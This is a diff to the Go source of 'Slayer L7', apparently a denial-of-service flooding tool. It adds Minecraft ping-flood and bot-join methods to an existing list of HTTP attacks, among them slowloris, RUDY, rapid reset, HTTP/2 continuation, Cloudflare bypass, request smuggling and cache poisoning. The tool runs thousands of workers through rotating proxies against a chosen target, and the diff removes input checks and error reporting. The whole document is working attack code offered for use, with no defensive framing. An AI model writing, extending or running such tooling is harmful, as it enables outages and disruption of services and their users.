+    reqPacket := []byte{byte(reqLen)}
+    reqPacket = append(reqPacket, loginStart...)
+
+    conn.Write(packet)
+    conn.Write(reqPacket)
+
+    buf := make([]byte, 4096)
+    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+    conn.Read(buf)
+
+    recordStatus("Sent")
     return nil
 }
 
@@ -1483,19 +1811,19 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpSmuggleCLTE(targetURL, stop)
         case "pingback":
             err = httpPingback(targetURL, client)
+        case "mc_ping":
+            err = mcPingFlood(targetURL, stop)
+        case "mc_bot":
+            err = mcBotJoin(targetURL, stop)
         default:
             fmt.Fprintf(os.Stderr, "\n  unknown method: %s\n", method)
             os.Exit(1)
         }
 
-        if err != nil {
-            totalErrors.Add(1)
-            if verbose {
-                fmt.Fprintf(os.Stderr, "[worker %d] %v\n", id, err)
-            }
-            continue
+        if err == nil {
+            totalSent.Add(1)
         }
-        totalSent.Add(1)
+        
         if rateMS > 0 {
             time.Sleep(time.Duration(rateMS) * time.Millisecond)
         }
@@ -1504,7 +1832,7 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
 
 func main() {
     target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
-    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback")
+    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, mc_ping, mc_bot")
     workerCount := flag.Int("w", 2048, "number of workers")
     dur := flag.Int("d", 30, "duration in seconds")
     pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
@@ -1513,16 +1841,9 @@ func main() {
     flag.Parse()
 
     if *target == "" {
-        fmt.Println(`  ______   __                                                 ______                       
- /      \ |  \                                               /      \                      
-|  $$$$$$\| $$  ______   __    __   ______    ______        |  $$$$$$\ __     __  _______  
-| $$___\$$| $$ |      \ |  \  |  \ /      \  /      \       | $$___\$$|  \   /  \|       \ 
- \$$    \ | $$  \$$$$$$\| $$  | $$|  $$$$$$\|  $$$$$$\       \$$    \  \$$\ /  $$| $$$$$$$\
- _\$$$$$$\| $$ /      $$| $$  | $$| $$    $$| $$   \$$       _\$$$$$$\  \$$\  $$ | $$  | $$ |  \__| $$| $$|  $$$$$$$| $$__/ $$| $$$$$$$$| $$            |  \__| $$   \$$ $$  | $$  | $$  \$$    $$| $$ \$$    $$ \$$    $$ \$$     \| $$             \$$    $$    \$$$   | $$  | $$   \$$$$$$  \$$  \$$$$$$$ _\$$$$$$$  \$$$$$$$ \$$              \$$$$$$      \$     \$$   \$$                         |  \__| $$                                                         
-                         \$$    $$                                                         
-                          \$$$$$$`)
+        fmt.Println("Slayer L7")
         fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
-        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback")
+        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | mc_ping | mc_bot")
         fmt.Println()
         flag.PrintDefaults()
         os.Exit(1)
@@ -1534,134 +1855,35 @@ func main() {
     proxyFile := *pFile
 
     validMethods := map[string]bool{
-        "httpget": true, "httppost": true, "rudy": true,
-        "apiflood": true, "rapidreset": true, "wsflood": true,
-        "slowloris": true, "headerflood": true, "mixpost": true, "cfbypass": true,
-        "range": true, "cookiebomb": true, "chunkpost": true, "malformed": true,
-        "h2continuation": true, "graphql_batch": true, "zstd_bomb": true,
-        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true,
+        "httpget": true, "httppost": true, "rudy": true, "apiflood": true, "rapidreset": true, "wsflood": true,
+        "slowloris": true, "headerflood": true, "mixpost": true, "cfbypass": true, "range": true, "cookiebomb": true,
+        "chunkpost": true, "malformed": true, "h2continuation": true, "graphql_batch": true, "zstd_bomb": true,
+        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "mc_ping": true, "mc_bot": true,
     }
     if !validMethods[strings.ToLower(*method)] {
         fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
-        fmt.Fprintf(os.Stderr, "  Valid methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback\n\n")
         os.Exit(1)
     }
-    if workers < 1 {
-        fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m -w must be >= 1\n\n")
-        os.Exit(1)
-    }
-    if duration < 1 {
-        fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m -d must be >= 1\n\n")
-        os.Exit(1)
-    }
-    {
-        parsedTarget, err := url.Parse(targetURL)
-        if err != nil || (parsedTarget.Scheme != "http" && parsedTarget.Scheme != "https") {
-            fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m target must start with http:// or https://\n\n")
-            os.Exit(1)
-        }
-    }
-
-    const (
-        reset   = "\033[0m"
-        red     = "\033[31m"
-        green   = "\033[32m"
-        yellow  = "\033[33m"
-        cyan    = "\033[36m"
-        magenta = "\033[35m"
-        bold    = "\033[1m"
-        dim     = "\033[2m"
-    )
-
-    fmt.Print("\033[2J\033[H")
-    fmt.Println(red + bold + `  ______   __                                                 ______                       
- /      \ |  \                                               /      \                      
-|  $$$$$$\| $$  ______   __    __   ______    ______        |  $$$$$$\ __     __  _______  
-| $$___\$$| $$ |      \ |  \  |  \ /      \  /      \       | $$___\$$|  \   /  \|       \ 
- \$$    \ | $$  \$$$$$$\| $$  | $$|  $$$$$$\|  $$$$$$\       \$$    \  \$$\ /  $$| $$$$$$$\
- _\$$$$$$\| $$ /      $$| $$  | $$| $$    $$| $$   \$$       _\$$$$$$\  \$$\  $$ | $$  | $$ |  \__| $$| $$|  $$$$$$$| $$__/ $$| $$$$$$$$| $$            |  \__| $$   \$$ $$  | $$  | $$  \$$    $$| $$ \$$    $$ \$$    $$ \$$     \| $$             \$$    $$    \$$$   | $$  | $$   \$$$$$$  \$$  \$$$$$$$ _\$$$$$$$  \$$$$$$$ \$$              \$$$$$$      \$     \$$   \$$                         |  \__| $$                                                         
-                         \$$    $$                                                         
-                          \$$$$$$` + reset)
-    fmt.Println()
-
-    fmt.Println(dim + "  ┌─────────────────────────────────────────┐" + reset)
-    fmt.Println(dim + "  │" + bold + cyan + "         ATTACK CONFIGURATION            " + reset + dim + "│" + reset)
-    fmt.Println(dim + "  ├─────────────────────────────────────────┤" + reset)
-    fmt.Printf(dim+"  │"+reset+" "+red+"TARGET"+reset+"   %-32s"+dim+"│"+reset+"\n", targetURL)
-    fmt.Printf(dim+"  │"+reset+" "+magenta+"METHOD"+reset+"   %-32s"+dim+"│"+reset+"\n", strings.ToUpper(*method))
-    fmt.Printf(dim+"  │"+reset+" "+yellow+"WORKERS"+reset+"  %-32d"+dim+"│"+reset+"\n", workers)
-    fmt.Printf(dim+"  │"+reset+" "+cyan+"DURATION"+reset+" %-32s"+dim+"│"+reset+"\n", fmt.Sprintf("%ds", duration))
-    proxyLabel := "DIRECT"
-    if proxyFile != "" {
-        proxyLabel = proxyFile
-    }
-    fmt.Printf(dim+"  │"+reset+" "+green+"PROXIES"+reset+"  %-32s"+dim+"│"+reset+"\n", proxyLabel)
-    fmt.Println(dim + "  └─────────────────────────────────────────┘" + reset)
-    fmt.Println()
-
-    frames := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
-    spinIdx := 0
 
     needsClientPool := true
     switch strings.ToLower(*method) {
-    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte":
+    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "mc_ping", "mc_bot":
         needsClientPool = false
     }
 
     var clients []*http.Client
 
     if proxyFile != "" {
-        if _, err := os.Stat(proxyFile); err != nil {
-            fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m proxy file not found: %s\n\n", proxyFile)
-            os.Exit(1)
-        }
-        done := make(chan []string)
-        go func() {
-            proxies, err := loadProxies(proxyFile)
-            if err != nil {
-                log.Fatalf(red + "  ✗ " + reset + "failed to load proxies: " + err.Error())
-            }
-            done <- proxies
-        }()
-        var proxies []string
-    spinLoop:
-        for {
-            select {
-            case proxies = <-done:
-                break spinLoop
-            default:
-                fmt.Printf("\r  %s%s%s Loading proxies...  ", yellow, frames[spinIdx%len(frames)], reset)
-                spinIdx++
-                time.Sleep(80 * time.Millisecond)
-            }
+        proxies, err := loadProxies(proxyFile)
+        if err != nil {
+            log.Fatalf("failed to load proxies: %v", err)
         }
         proxyList = proxies
-        fmt.Printf("\r  %s✓%s Loaded %s%d%s proxies                \n", green, reset, bold, len(proxies), reset)
-
         if needsClientPool {
-            done2 := make(chan []*http.Client)
-            go func() {
-                c, err := buildClientPool(proxies, workers)
-                if err != nil {
-                    log.Fatalf(red + "  ✗ " + reset + "failed to build client pool: " + err.Error())
-                }
-                done2 <- c
-            }()
-            spinIdx = 0
-        spinLoop2:
-            for {
-                select {
-                case clients = <-done2:
-                    break spinLoop2
-                default:
-                    fmt.Printf("\r  %s%s%s Building client pool...  ", yellow, frames[spinIdx%len(frames)], reset)
-                    spinIdx++
-                    time.Sleep(80 * time.Millisecond)
-                }
+            clients, err = buildClientPool(proxies, workers)
+            if err != nil {
+                log.Fatalf("failed to build client pool: %v", err)
             }
-            fmt.Printf("\r  %s✓%s Built %s%d%s proxy clients            \n", green, reset, bold, len(clients), reset)
-        } else {
-            fmt.Printf("  %s✓%s Skipped client pool (%s uses raw connections)\n", green, reset, strings.ToUpper(*method))
         }
     } else {
         if needsClientPool {
@@ -1672,82 +1894,31 @@ func main() {
             if poolSize > maxDirectPool {
                 poolSize = maxDirectPool
             }
-            fmt.Printf("\r  %s✓%s Direct mode (no proxies)\n", green, reset)
             clients = buildDirectPool(poolSize)
-            fmt.Printf("  %s✓%s Built %s%d%s direct clients            \n", green, reset, bold, poolSize, reset)
-        } else {
-            fmt.Printf("\r  %s✓%s Direct mode (no proxies)\n", green, reset)
-            fmt.Printf("  %s✓%s Skipped client pool (%s uses raw connections)\n", green, reset, strings.ToUpper(*method))
         }
     }
-    fmt.Println()
-
-    for i := 3; i >= 1; i-- {
-        fmt.Printf("\r  %s%s⚡ Launching in %d...%s  ", bold, red, i, reset)
-        time.Sleep(700 * time.Millisecond)
-    }
-    fmt.Printf("\r  %s%s⚡ ATTACK LIVE              %s\n\n", bold, red, reset)
-
-    stop := make(chan struct{})
 
     if clients == nil {
         clients = []*http.Client{{}}
     }
 
+    stop := make(chan struct{})
     for i := 0; i < workers; i++ {
         go Worker(i, targetURL, *method, clients, stop, *verbose, *rateDelay)
     }
 
-    fmt.Printf("  %s%s▸%s %s%d%s workers launched → %s%s%s for %s%ds%s\n\n",
-        bold, green, reset, bold, workers, reset,
-        cyan, strings.ToUpper(*method), reset,
-        yellow, duration, reset)
-
-    ticker := time.NewTicker(2 * time.Second)
+    ticker := time.NewTicker(100 * time.Millisecond)
     defer ticker.Stop()
-    start := time.Now()
 
-    go func() {
-        for range ticker.C {
-            elapsed := time.Since(start).Seconds()
-            sent := totalSent.Load()
-            errs := totalErrors.Load()
-            nonSucc := totalNonSucc.Load()
-            rps := float64(sent) / elapsed
-            errColor := green
-            if errs > 0 {
-                errColor = red
-            }
-            nonSuccColor := green
-            if nonSucc > 0 {
-                nonSuccColor = yellow
-            }
-            fmt.Printf("\r  %s[%.0fs]%s Sent: %s%d%s │ Non-2xx: %s%d%s │ Errors: %s%d%s │ RPS: %s%.0f%s   ",
-                dim, elapsed, reset,
-                bold+green, sent, reset,
-                bold+nonSuccColor, nonSucc, reset,
-                bold+errColor, errs, reset,
-                bold+cyan, rps, reset)
+    for {
+        select {
+        case <-time.After(time.Duration(duration) * time.Second):
+            close(stop)
+            drawUI(targetURL, *method, proxyFile, workers, duration)
+            fmt.Println("\n  \033[1m\033[31mATTACK COMPLETE\033[0m")
+            os.Exit(0)
+        case <-ticker.C:
+            drawUI(targetURL, *method, proxyFile, workers, duration)
         }
-    }()
-
-    time.Sleep(time.Duration(duration) * time.Second)
-    close(stop)
-
-    sent := totalSent.Load()
-    errs := totalErrors.Load()
-    nonSuccFinal := totalNonSucc.Load()
-    avgRPS := float64(sent) / float64(duration)
-    fmt.Println()
-    fmt.Println()
-    fmt.Println(dim + "  ┌─────────────────────────────────────────┐" + reset)
-    fmt.Println(dim + "  │" + bold + red + "             ATTACK COMPLETE              " + reset + dim + "│" + reset)
-    fmt.Println(dim + "  ├─────────────────────────────────────────┤" + reset)
-    fmt.Printf(dim+"  │"+reset+" "+green+"SENT"+reset+"     %-34d"+dim+"│"+reset+"\n", sent)
-    fmt.Printf(dim+"  │"+reset+" "+yellow+"NON-2XX"+reset+"  %-34d"+dim+"│"+reset+"\n", nonSuccFinal)
-    fmt.Printf(dim+"  │"+reset+" "+red+"ERRORS"+reset+"   %-34d"+dim+"│"+reset+"\n", errs)
-    fmt.Printf(dim+"  │"+reset+" "+cyan+"AVG RPS"+reset+"  %-34.0f"+dim+"│"+reset+"\n", avgRPS)
-    fmt.Printf(dim+"  │"+reset+" "+yellow+"DURATION"+reset+" %-34s"+dim+"│"+reset+"\n", fmt.Sprintf("%ds", duration))
-    fmt.Println(dim + "  └─────────────────────────────────────────┘" + reset)
-    fmt.Println()
+    }
 }
